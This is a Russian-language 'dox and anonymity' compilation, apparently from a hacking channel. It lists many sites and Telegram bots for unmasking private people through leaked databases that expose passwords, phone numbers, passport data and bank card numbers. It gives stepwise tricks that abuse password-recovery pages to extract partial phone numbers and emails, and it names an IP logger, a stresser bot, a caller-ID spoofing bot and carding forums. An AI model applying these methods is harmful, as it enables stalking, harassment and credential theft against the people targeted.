http://rnp.fas.gov.ru/?rpage=687&status=find – Реестр недобросовестных поставщиков ФАС РФ
Портал услуг - портал услуг Федеральной Службы Государственной Регистрации, Кадастра и Картографии, где можно получить сведения о земельной собственности и расположенной на ней недвижимости.
http://services.fms.gov.ru/info-service.htm?sid=2000 – официальный сайт Федеральной миграционной службы России, где можно получить информацию о наличии/отсутствии регистрации того или иного гражданина на территории РФ и некоторую иную информацию.
http://www.notary.ru/notary/bd.html - нотариальный портал. Содержит список с координатами всех частных практикующих нотариусов России и нотариальных палат. Для зарегистрированных пользователей доступна судебная практика нотариусов и файловый архив. База обновляется ежедневно.
http://kad.arbitr.ru/ – он-лайн картотека Арбитражного Суда Российской Федерации. Чрезвычайно полезна при умелом использовании для конкурентной разведки.
http://allchop.ru/ - Единая база всех частных охранных предприятий
http://enotpoiskun.ru/tools/codedecode/ - Расшифровка кодов ИНН, КПП, ОГРН и др.
http://enotpoiskun.ru/tools/accountdecode/ - Расшифровка счетов кредитных организаций
http://polis.autoins.ru/ - Проверка полисов ОСАГО по базе Российского союза автостраховщиков
http://www.mtt.ru/ru/defcodes/ - Коды мобильных операторов. Очень удобный поиск.
http://www.vinformer.su/ident/vin.php?setLng=ru - Расшифровка VIN транспортных средств
http://www.vinvin.ru/about.html - Проверка VIN транспортных средств по американским БД "CARFAX" и "AutoCheck"
http://www.stolencars24.eu/ - Проверка на угон проверка по полицейским базам данных Италии, Словении, Румынии, Словакии и Чехии, а также по собственной базе данных (без ограничения количества запросов)
http://www.autobaza.pl/ - Проверка на угон в Италии, Словении, Литве (не более 3 запросов в сутки с одного IP)
http://www.alta.ru/trucks/truck.php - Расчет таможенных платежей при ввозе автомобилей из-за границы
http://kupipolis.ru/ - Расчет КАСКО, ОСАГО
http://ati.su/Trace/Default.aspx - Расчет расстояний между населенными пунктами по автодорогам
http://www.garant.ru/doc/busref/spr_dtp/ - Штрафы за нарушение Правил дорожного движения онлайн
http://fotoforensics.com/ - Сервис для проверки подлинности фотографии, выявление изменений метаданных и т.п.
http://mediametrics.ru/rating/ru/online.html - Онлайн сервис по отслеживанию популярных тем в социальных сетях и СМИ

Всех приветствую, сегодня хотел бы вам предоставить(dox и анонимность)

КАНАЛ: Hack FISH 

Deanon Instagram.
SearchMy — Здесь можно обнаружить искомый профиль можно с помощью поиска на сайте.

Instadp — Сервис нужный для того, чтобы получить аватарку пользователя в полном размере в наилучшем качестве.

FindClone — Данный сервис позволяет найти родственников или другие аккаунт человека по фото.

Av3 — Браузерное расширение для Google Chrome, которое собирает и выдает информацию об аккаунте.

Maigret — С помощью данного Telegram бота можно найти другие аккунты аккаунтов цели в других социальных сетях по никнейм. 

Ip-адрес.
• https://whatismyipaddress.com/
• http://www.ipaddresslocation.org/
• https://lookup.icann.org/
• https://www.hashemian.com/whoami/

Email.
Боты
 1. haveibeenpwned.com — проверка почты в слитых базах

2. emailrep.io — найдет на каких сайтах был зарегистрирован аккаунт использующий определенную почту

3. dehashed.com (r) — проверка почты в слитых базах

4. intelx.io — многофункциональный поисковик, поиск осуществляется еще и по даркнету

5. @info_baza_bot — покажет из какой базы слита почта, 2 бесплатных скана

6. leakedsource.ru — покажет в каких базах слита почта

7. mostwantedhf.info — найдет аккаунт skype

8. email2phonenumber (t) — автоматически собирает данные со страниц восстановления аккаунта, и находит номер телефона

9. spiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию

10. @last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка

11. searchmy.bio — найдет учетную запись Instagram с электронной почтой в описании

12. AVinfoBot (r) — найдет аккаунт в ВК

13. account.lampyre.io (t, r) — программа выполняет поиск по аккаунтам в соц. сетях и мессенджерам и другим источникам

14. ГлазБога.com (r) — найдет фото из аккаунтов пользователя 

15. @StealDetectorBOT — поисковик по базам утечек, найдет частть пароля и источник утечек

16. cyberbackgroundchecks.com — найдет все данные гражданина США, вход на сайт разрешен только с IP адреса США

17. holehe (t) — инструмент проверяет аккаунты каких сайтов зарегистрированы на искомый email адрес, поиск по 30 источникам

18. tools.epieos.com — найдет Google ID, даст ссылки на профиль в Google карты, альбомы и календарь, найдет к каким сайтам привязана почта, профиль LinkedIn

19. @UniversalSearchBot — найдет профили на Яндекс, в сервисах Google, утекшие пароли, социальные сети, адрес регистрации, номер телефона, био, Gmail адрес и прочее

20. grep.app — поиск в репозиториях GitHub

21. @PasswordSearchBot — выдает пароли

22. Checker

@PhoneLeaks_bot - найдет в каких базах слит номер

@infobazaa_bot - найдет в слитых базах фио, адрес.

VK.
 220vk.com (https://220vk.com/) — определит средний возраст друзей, скрытых друзей, города друзей, дата регистрации и т.д
 archive.is (https://archive.is/) — архивированная страница аккаунта
 archive.org — покажет архивированную версию аккаунта
 searchlikes.ru (https://searchlikes.ru/)  найдет где есть лайки и комментарии, дает статистику друзей
 tutnaidut.com (https://tutnaidut.com/) — информация аккаунта несколько лет назад
 vk.watch (https://vk.watch/) — покажет историю аккаунта с 2016 года, ограниченная информация, покажет фото в низком качестве, можно уменьшить масштаб фото, тем самым распознать что там изображено
 vk5.city4me.com (https://vk5.city4me.com/) — cтатистика онлайн активности, скрытые друзья
 vkdia.com (https://vkdia.com/) — определит с кем из друзей переписывается человек
 vk-express.ru (https://vk-express.ru/) — слежка за аккаунтом, после добавления будут доступны аватары, лайки, комментарии, друзья группы и т.д.
 vk-photo.xyz (https://vk-photo.xyz/) — частные фото аккаунта
 yasiv.com (http://yasiv.com/vk) — создает граф из друзей аккаунта, после регистрации добавьте в граф аккаунт того кого хотите просмотреть
 yzad.ru (https://yzad.ru/) — находит владельца

 Узнаём номер телефона аккаунта VK через Одноклассники:

1. В ВК добавьте аккаунт в друзья
2. Перейдите в Одноклассники и откройте раздел мои друзья
3. Нажмите на кнопку 'добавить друзей из ВК'
4. Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК
5. Перейдите по ссылке - https://ok.ru/password/recovery и выберите восстановить через профиль
6. Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать

В результате вы получите часть номера телефона и e-mail адреса

Tг боты:
@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.

@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей

@info_baza_bot – база данных номеров телефона, email

@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»

@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП

@YouControlBot - полное досье на каждую компанию Украины

@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе

@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта

@UAfindbot – База данных

@FindClonesBot – Поиск человека по фото

@MsisdnInfoBot - Получение сведений о номере телефона

@AVinfoBot - Поиск сведений об автовладельце России

@antiparkon_bot - Поиск сведений об автовладельце

@friendsfindbot - Поиск человека по местоположению

@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России

@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.

@bmi_np_bot - По номеру телефона определяет регион и оператора.

@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.

@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook.

@buzzim_alerts_bot - Ищет упоминания ников/каналов в чатах статьях.

@avinfobot - по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.

@VKUserInfo_bot — по ID «ВКонтакте» возвращает расширенную информацию о профиле.

@GetGmail_bot (GetGmail — OSINT email search) — по gmail-почте отдает Google ID, зная который, можно получить архив альбомов Google.

@telesint_bot (TeleSINT) — информация об участии пользователей Telegram в открытых и закрытых группах. Поиск — по нику.

@iptools_robot — бот для быстрого поиска информации о домене и ip адресе. Бот конечно же бесплатный

@phone_avito_bot — найдет аккаунт на Авито по номеру телефона России. Еще бот показывает данные из GetContact.

@Dosie_bot – теперь бот дает еще больше информации. Для нового аккаунта 3 бесплатные полные попытки поиска.

@egrul_bot - Данный бот пробивает Конторы/ИП. По вводу ФИО/Фирмы предоставляет ИНН объекта; 
учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы.

@get_kontakt_bot- Бот пробивает номер мобильного телефона. 
Как записан запрашиваемый контакт в разных телефонных книжках ваших товарищей/подруг/коллег.

@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД

@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в Фэйсбуке.

@buzzim_alerts_bot - Поисковая система по платформе Telegram. 
Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт.

@AvinfoBot - Бот, который по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.

1.@phonenumberinformation_bot
2. @Quick_osintik_bot
3. @UniversalSearchRobot
4. @search_himera_bot
5. @Solaris_Search_Bot
6. @Zernerda_bot
7. @t_sys_bot
8. @OSINTInfoRobot
9. @LBSE_bot
10. @SovaAppBot
11. @poiskorcombot
12. @SEARCHUA_bot
13. @helper_inform_bot
14. @infobazaa_bot
15. @declassified_bot
16. @GHack_search_bot
17. @osint_databot
18. @Informator_BelBot
19. @HowToFindRU_Robot
20. @SEARCH2UA_bot
21. @UsersSearchBot
22. @BITCOlN_BOT
23. @ce_poshuk_bot
24. @BlackatSearchBot
25. @dataisbot
26. @n3fm4xw2rwbot
27. @cybersecdata_bot
28. @safe_search_bot
29. @getcontact_real_bot
30. @PhoneLeaks_bot
31. @useridinfobot 
32. @mailcat_s_bot
33. @last4mailbot
34. @holehe_s_bot
35. @bmi_np_bot
36. @clerkinfobot
37. @kolibri_osint_bot
38. @getcontact_premium_bot
39. @phone_avito_bot
40. @pyth1a_0racle_bot
41. @olx_phone_bot
42. @ap_pars_bot
43. @SPOwnerBot
44. @regdatebot
45. @ibhldr_bot
46. @TgAnalyst_bot
47. @cryptoscanning_bot
48. @LinkCreatorBot
49. @telesint_bot
50. @Checknumb_bot
51. @TelpoiskBot_bot
52. @TgDeanonymizer_bot
53. @protestchat_bot
54. @locatortlrm_bot
55. @GetCont_bot
56. @usinfobot
57. @SangMataInfo_bot
58. @creationdatebot
59. @tgscanrobot
60. @InfoVkUser_bot
61. @getfb_bot
62. @GetOK2bot
63. @VKHistoryRobot
64. @detectiva_robot
65. @FindNameVk_bot
66. @vk2017robot
67. @AgentFNS_bot
68. @OpenDataUABot
69. @egrul_bot
70. @Bumz639bot
71. @ogrn_bot
72. @ShtrafKZBot
73. @egrnrobot
74. @VipiskaEGRNbot
75. @Search_firm_bot
76. @geomacbot
77. @pwIPbot
78. @ipscorebot
79. @ip_score_checker_bot
80. @FakeSMI_bot
81. @ipinfo_check_bot
82. @Search_IPbot
83. @WhoisDomBot
84. @vimebasebot
85. @maigret_osint_bot
86. @PasswordSearchBot
87. @ddg_stresser_bot
88. @BotAvinfo_bot
89. @reverseSearch2Bot
90. @pimeyesbot
91. @findfacerobot
92. @CarPlatesUkraineBot
93. @nomerogrambot
94. @ShtrafyPDRbot
95. @cerbersearch_bot

Находим аккаунт в ВК зная e-mail адрес от Яндекса.

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке 
3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) 
4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com 

Пробив номера.
http://www.freecellphonedirectorylookup.com

http://www.numberway.com/

http://www.fonefinder.net

http://www.whitepages.com/reverse-lookup

http://www.anywho.com/reverse-lookup

http://www.yellowpages.com/reversephonelookup

http://www.spydialer.com/

http://www.intelius.com/reverse-phone-lookup.html

truecallerapp.com
▫️ Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по почте
▫️ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах
▫️ Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона
▫️ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона
▫️ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях
▫️ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту
▫️ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN
▫️ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации
▫️ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
▫️ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город
▫️ Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
▫️ @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер

Пробив по ID/Юзеру телеги
Telegago — найдет упоминание аккаунта в каналах, группах, включая приватные, а так же в Telegraph статьях

lyzem.com — найдет упоминание аккаунта в группах и каналах

cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт

tgstat.com — поиск по публичным сообщениям в каналах, найдет упоминание аккаунта

@SangMataInfo_bot — история изменения имени аккаунта

@TeleSINT_Bot — найдет группы в которых состоит пользователь

@creationdatebot — примерная дата создания аккаунта, бот принимает username, для поиска по ID можно переслать сообщение от искомого пользователя

@MySeekerBot — поисковик по иранским каналам

TelegramOnlineSpy (t) — лог онлайн активности аккаунта, скажет когда был в сети

Exgram — найдет упоминание аккаунта, это поисковая система на основе Яндекса, поиск по 17 сайтам-агрегаторам, находит в Telegraph статьях, контактах, приватных и публичных каналах с группами

Commentgram — найдет упоминание аккаунта, поиск в комментариях к постам в Telegram, работает через Google

Commentdex — найдет упоминание аккаунта, поиск в комментариях к постам в Telegram, работает через Яндекс

глазбога.рф — найдет часть номера телефона, историю изменения ссылки аккаунта

@clerkinfobot — дает номер телефона

@usersbox_bot — по нику найдет номер телефона, бесплатный доступ 14 дней после первого запуска бота

@TuriBot — выдает по ID имя пользователя аккаунта Telegram, отправь боту команду /resolve + ID

@eyeofbeholder_bot — даёт интересы аккаунта, а платно выдаст историю изменения имени, номер телефона, группы и ссылки которые публиковал пользователь.

• Поиск человека по аккаунту ВКонтакте:
 • searchlikes.ru
 • tutnaidut.com 
 • 220vk.com 
 • @VKUserInfo_bot 
 • vk5.city4me.com 
 • vk.watch 
 • vk-photo.xyz 
 • vk-express.ru 
 • archive.org 
 • yasiv.com
 • archive.is 
 • @InfoVkUser_bot
 • @FindNameVk_bot
 • yzad.ru
 • vkdia.com
 • @GetPhone_bot
 • @Quick_OSINT_bot

• Поиск человека по Twitter аккаунту:
 • followerwonk.com 
 • sleepingtime.org
 • foller.me
 • socialbearing.com
 • keyhole.co
 • analytics.mentionmapp.com
 • burrrd.com
 • keitharm.me
 • archive.org
 • @usersbox_bot
 • undelete.news 

• Поиск человека по Facebook аккаунту:
 • graph.tips
 • whopostedwhat.com
 • lookup-id.com
 • keyhole.co
 • archive.org
 • @usersbox_bot
 • @GetPhone_bot

• Поиск человека по Instagram аккаунту:
 • gramfly.com
 • storiesig.com
 • codeofaninja.com
 • sometag.org
 • keyhole.co
 • archive.org
 • @InstaBot
 • @usersbox_bot
 • undelete.news

• Поиск человека по Reddit аккаунту:
 • snoopsnoo.com
 • redditinsight.com
 • redditinvestigator.com
 • archive.org
 • redditcommentsearch.com

• Поиск человека по Skype
 • mostwantedhf.info
 • cyber-hub.pw
 • webresolver.nl
 • @usersbox_bot

Сервисы:
1. https://onli-vk.ru/pivatfriends.php?id=123456789 — поиск друзей закрытого аккаунта, замените 123456789 на ID аккаунта VK
2. https://vk.com/feed?obj=123456789&q=&section=mentions — упоминания аккаунта, замените 123456789 на ID аккаунта
3. https://ruprofile.pro/vk_user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
4. https://rusfinder.pro/vk/user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
5. https://my.mail.ru/vk/123456789 — найдет аккаунт на Мой Мир, замените 123456789 в ссылке на ID аккаунта
6. https://vk.com/foaf.php?id=123456789 — найдет количество друзей, количество подписчиков и дату рождения, дату изменения имени и прочее, замените 123456789 в ссылке на ID аккаунта, откройте исходный код страницы Ctrl+U
7. https://topdb.ru/username — найдет архивную копию профиля и фото, иногда нужен VPN, замените username на логин пользователя или ID, например id1234567
8. https://bigbookname.com/user/id-123456789 — историческая копия аккаунта с фото, друзьями, датой рождения, городом и информацией о себе, замените 123456789 на ID аккаунта VK

сервисы для поиска информации о человеке в интернете

www.zoomeye.org — найдет IP, открытые порты, номер автономной системы, и много другого

binaryedge.io — найдет IP, открытые порты, номер автономной системы, и много другого

censys.io — найдет IP, открытые порты, номер автономной системы, и много другого

viz.greynoise.io — найдет IP, открытые порты, номер автономной системы, и много другого

onyphe.io — найдет IP, открытые порты, номер автономной системы, и много другого

fofa.so — найдет IP, открытые порты, номер автономной системы, и много другого

maltiverse.com — найдет IP, открытые порты, номер автономной системы, и много другого

insecam.org — найдет камеры видеонаблюдения

shodan.io — найдёт любые устройства, которые подключены к интернету.

Сайты для DEANONA:
https://rulait.github.io/vk-friends-saver/ 
http://archive.is/ 
http://peeep.us/
https://archive.org/
http://www.cachedpages.com/ 
http://skyperesolver.net/ 
https://yip.su
https://vedbex.com/tools/iplogger 
http://phoneradar.ru/phone/ 
http://afto.lol/ 
http://zaprosbaza.pw/ 
https://radaris.ru/
https://service.nalog.ru/inn.html 
http://services.fms.gov.ru/info-service.htm?sid=2000 
https://2ch.hk/b/ 
http://sonetel.com/
http://psi-im.org/ 
https://discordapp.com/ 
http://viber.com/
http://www.vpnbook.com/
https://www.vpnkeys.com/ 
https://www.tcpvpn.com/ 
https://prostovpn.org/ 
https://lightvpn.pro/
http://spys.ru/
https://insorg.org
http://sockshub.net/ 
http://www.cekpr.com/decode-short-url/ 
https://temp-mail.org/
https://perfectmoney.is/
https://blockchain.info/
https://blackbiz.ws/ 
https://darkwebs.cc/
https://zblock.co/ 
https://newage-bank.com/
http://upbitcoin.com/
http://tomygame.com/
https://freebitco.in/
http://gr8.cc/

 Отличаем виртуальный номер от настоящего.
Для этого нам поможет сервис:

https://m.smsc.ru/testhlr/

Осуществляет проверку номера HLR-запросом и выдает информацию о номере.

https://data.intelx.io/saverudata/#/?n=

 Fecebook.
1. lookup-id.com — находит числовой ID аккаунта
2. graph.tips — дает возможность просматривать, каким публикациям ставил лайки
пользователь
3. whopostedwhat.com — найдет посты в Facebook
4. fb-sleep-stats (t) — отслеживает онлайн / оффлайн статус людей, можно получить
точную информацию о времени их сна
5. keyhole.co (r) — анализ аккаунта, при регистрации нет проверок по email и телефону,
вводите любые данные
6. cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на
сайты веб архивы, поиск по ссылке на аккаунт
7. UsersBox.org — бот, найдет аккаунты в ВК у которых в поле Facebook указан
искомый логин, введите в боте facebook: <логин>
8. ffff (t) — частично реконструирует скрытых друзей, используя функциональность
"общие друзья". Требуется знать хотя бы другую учетную запись, имеющую хотя бы
одного общего друга с целью
9. smartsearchbot.com — находит email, номер телефона и другое, бесплатный поиск не
доступен для новых пользователей
10. @getfb_bot (r) — найдет номер телефона
11. @QuickOSINT_Robot — найдет соц. сети, логины, телефоны, адрес и многое
другое, всего 3 бесплатных запроса для новых аккаунтов
12. app.element.io (r) — найдет сохранённую копию аккаунта по ID, это имя и аватарка,
после регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск
13. Fuck-Facebook — найдет номер телефона аккаунта Facebook в глобальной утечке,
нужно пройти капчу перед поиском
14. @Zernerda_bot — ищет в слитых базах, находит телефон, имя аккаунта и прочее,
бесплатный поиск после первого запуска бота(спиздил пост = мать где?)
15. @a11_1n_bot (r) — найдет имя и номер телефона
16. @declassified_bot — найдет телефон, имена, адреса, аккаунт telegram
17. @detectiva_bot — вытаскивает часть номера телефона 

Сайты:
1. https://www.facebook.com/browse/fanned_pages/?id=USERID — найдет лайки
пользователя, замените USERID на ID аккаунта
2. https://facebook.com/friendship/USERID/USERID — будут отображаться общие друзья,
общие записи и фотографии, а также любые другие связанные данные, такие как
родные города, школы и т. д., замените USERID на ID аккаунта
3. https://facebook.com/browse/mutual_friends/?uid=USERID&node=USERID — найдет
общих друзей, которые имеют общедоступные списки друзей, если у одного из
искомых пользователей есть общедоступный список друзей, замените USERID на ID
аккаунта
4. https://my.mail.ru/fb/USERID — найдет аккаунт на Мой Мир, замените USERID в
ссылке на ID аккаунта

И На Последок Анонимность:

1. Заведите себе еще одну учетную запись

Сегодня электронная почта превратилась в универсальный идентификатор личности сетевого пользователя. Поэтому, прежде всего, стоит позаботиться о втором (третьем, четвертом) адресе электронной почты. Это может быть как просто дополнительный аккаунт Gmail, так и один из специальных почтовых сервисов, описанных в этой статье. После этого зарегистрируйте на него новые учетные записи в социальных сетях и других необходимых сервисах. Никогда не смешивайте свой публичный и частный профиль.

2. Не пользуйтесь отечественными сервисами

Я ничего не имею против наших поисковых, почтовых, социальных сайтов, во многом они даже лучше. Хуже они только в том, что, при необходимости, заинтересованные люди или структуры могут довольно легко выцарапать необходимую им информацию о вас. Поэтому не пользуйтесь сервисами той страны, в которой вы проживаете.

3. Меняйте место подключения

Если вы хотите еще более усложнить работу потенциальных преследователей, то не сидите дома, а прогуляйтесь по окрестностям. Внимательный и вдумчивый поиск подскажет вам десятки доступных кафе, компьютерных клубов, библиотек из которых вы можете пользоваться услугами сети Интернет, не рискуя засветить своей реальный и сетевой адрес.

Программные способы

1. Прокси-серверы

Говоря совсем просто, прокси — это некий сервис или программа, которая выступает в роли посредника между вами и запрашиваемым вами сайтом. Получается, что все ваши запросы при серфинге будут адресоваться только одному серверу, а он уже будет отправлять их куда необходимо. Кроме банального поиска в сети открытых прокси, которых вполне достаточно, в том числе и бесплатных, можно использовать эту технологию и более изощренными методами, о которых мы писали в следующих статьях:

Как получить доступ к недоступным в вашей стране сайтам
4 бесплатных прокси-сервера для блокирования рекламы
Как использовать сервисы Google для доступа к запрещенным сайтам
2. VPN

Virtual Private Network — это несколько технологий и методов, позволяющих создать между пользователем и сетью Интернет специальный зашифрованный и недоступный к отслеживанию канал. Это позволяет скрыть свой реальный IP адрес и стать анонимным, а также шифровать свой трафик. В рамках этой статьи мы не будем останавливаться на расшифровке особенностей работы разных протоколов VPN, отметим только, что метод этот, в целом, достаточно надежен и прост в использовании. О практическом его применении вы можете узнать из наших следующих статей:

ZenMate — бесплатный VPN для Google Chrome
Три простых способа читать заблокированные сайты в вашей стране
TunnelBear — cамый простой VPN на вашем Android
Hotspot Shield — интернет без границ

Всегда используйте не настоящие имена, фамилии, даты рождения, город и тд.(Никогда не выкладывайте личные данные, такие как номер телефона, адрес или дату рождения, если этого не требует предоставление данной информации социальной сетью.)

Ставте максимально приватные настройки на основных аккаунтах.

Не открывайте ссылки или прикрепленные файлы от неизвестных отправителей, так как они могут содержать вирусы или вредоносное ПО.

Отключите геолокационную службу на всех ваших устройствах, чтобы другие не могли отследить ваше местоположение.

🛂 ФИО
└ Поиск ФИО

📂 Содержимое раздела:
▫ Occrp (https://aleph.occrp.org/) — поиск по базам данных, файлам, реестрам компаний, утечкам, и другим источникам
▫ Locatefamily (https://www.locatefamily.com/) — найдет адрес
▫ Infobel (https://www.infobel.com/fr/world) — найдет номер телефона, адрес и ФИО
▫ Rocketreach (http://rocketreach.co/) — поиск людей в linkedIn, Facebook и на других сайтах, находит email
▫ @egrul_bot (https://t.me/@egrul_bot) — найдет ИП и компании
▫ Яндекс.Люди (https://yandex.ru/people) — поиск по социальным сетям
▫ реестр залогов (https://www.reestr-zalogov.ru/state/index) — поиск по залогодателям, даст паспортные данные, место и дату рождения и т.д.
▫ Zytely (https://zytely.rosfirm.info/) — найдет адрес прописки и дату рождения, необходимо знать город
▫ Mmnt (http://mmnt.ru/) — найдет упоминания в документах
▫ Kad.arbitr.ru (http://kad.arbitr.ru/) — дела, рассматриваемые арбитражными судами
▫ Fedresurs (http://bankrot.fedresurs.ru/?attempt=1) — поиск по банкротам, можно узнать ИНН, СНИЛС и адрес
▫ Sudact (https://sudact.ru/) — судебные и нормативные акты РФ, поиск по участникам и судам
▫ Fssprus (http://fssprus.ru/iss/ip/) — проверка задолженностей, для физ. лица
▫ Notariat (https://data.notariat.ru/directory/succession/search?..) — поиск в реестре наследственных дел, найдет дату смерти человека и адрес нотариуса оформившее дел
📱 Телефон
└ Поиск по номеру телефона

📂 Содержимое раздела:
▫ Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге
▫ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах
▫ Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона
▫ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона
▫ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях
▫ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту
▫ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN
▫ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации
▫ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
▫ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город
▫ Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
▫ @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных
▫ @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона
▫ @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
▫ FA FA (https://fa-fa.kz/search_ip_too/) — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд
▫ @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка

▫ Personlookup (https://personlookup.com.au/) — найдет имя и адрес
▫ Gofindwho (https://gofindwho.com/) — поиск по базе
▫ Spiderfoot (https://www.spiderfoot.net/) — автоматический поиск с использованием огромного количества методов, ножно использовать в облаке если пройти регистрацию
▫ Truepeoplesearch (http://truepeoplesearch.com/) — найдет записи о владельцах номера телефона
▫ Zabasearch (http://www.zabasearch.com/) — найдет имя, адрес, и многое другое
▫ Intelius (https://www.intelius.com/criminal-records/) — поиск в криминальной базе, найдет адрес, места работы, телефонные номера и покажет где учился человек
▫ Eniro (https://www.eniro.se/) — найдет ФИО, местоположение на карте и фото дома
▫ Datacvr.virk.dk (https://datacvr.virk.dk/data/) — поиск в сведениях о зарегистрированных предпринимателях и компаниях
▫ Upplysning (https://www.upplysning.se/) — поиск информации
▫ Paginebianche (https://www.paginebianche.it/) — найдет ФИО и адрес
▫ Locatefamily (https://www.locatefamily.com/) — поиск адреса и ФИО
▫ Nuga — поиск instagram
▫ Live.com (http://account.live.com/) — Проверка привязки к майкрософт
▫ Telefon (http://telefon.stop-list.info/) — Поиск по всем фронтам
▫ @FindNameVk_bot (https://t.me/@FindNameVk_bot) — Бот ищет историю смены фамилий профиля по открытым источникам, указывает дату создания аккаунта.
▫ @@InfoVkUser_bot (https://t.me/@@InfoVkUser_bot) — Бот позволяет провести анализ друзей профиля. Сейчас доступны ВУЗы и родные города.
@findnamevk бот в тг
Для номера телефона России

1. @Smart_SearchBot — найдет ФИО, дату рождения и адрес
2. @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID
3. @mailsearchbot — найдет часть пароля
4. @AvinfoBot – делает отчет где есть данные из социальных сетей, недвижимости, автомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для отчета
5. getcontact.com (r) — найдет информацию о том как записан номер в контактах
6. @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact
7. PhoneInfoga (https://github.com/sundowndev/PhoneInfoga)(t)
8. truecaller.com (r) — телефонная книга, найдет имя и оператора телефона
9. mirror.bullshit.agency — поиск объявлений по номеру телефона
10. bases-brothers.ru — поиск номера в объявлениях
11. account.live.com — проверка привязанности номера к microsoft аккаунту
12. avinfo.guru — проверка телефона владельца авто, иногда нужен VPN
13. telefon.stop-list.info — поиск по всем фронтам, иногда нет информации
14. @numberPhoneBot — найдет адрес и ФИО, не всегда находит
15. zytely.rosfirm.info — найдет ФИО, адрес прописки и дату рождения, нужно знать город
16. spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес
17. nuga.app (r) — найдет Instagram аккаунт, авторизация через Google аккаунт и всего 1 попытка
18. @MyGenisBot — найдет имя и фамилию владельца номера
19. contacts.google.com — находит аккаунт в Google, чтобы узнать как его находить нажмите - /GoogleID
20. account.lampyre.io (r) — веб версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге
21. @EyeGodBot — найдет имя владельца, соц. сети, парковки с номерами машин
22. @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
23. @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail
24. @GetPhone_bot — поиск номера телефона в утекших базах
25. osintbot (http://vk.com/osintbot) — бот в ВК, находит Instagram, Skype, Caller ID и много других данных которые берет из Lampyre и утекших баз данных
Поиск по объявлениям на Авите
mirror.bullshit.agency
